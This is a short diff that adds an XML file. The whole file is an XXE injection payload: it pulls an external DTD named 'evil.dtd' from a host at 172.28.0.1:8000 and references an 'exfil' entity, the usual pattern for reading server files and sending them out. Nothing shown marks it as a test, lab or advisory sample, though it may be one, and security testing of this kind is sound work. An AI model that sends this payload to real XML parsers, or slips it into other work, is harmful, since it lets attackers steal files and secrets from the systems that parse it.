@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY % ext SYSTEM "http://172.28.0.1:8000/evil.dtd">
+  %ext;
+]>
+<foo>&exfil;</foo>
